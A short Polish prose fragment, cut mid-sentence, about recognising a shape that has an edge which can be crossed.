rozpoznaniu KSZTAŁTU, która ma brzeg, i brzeg da się przekroczyć.
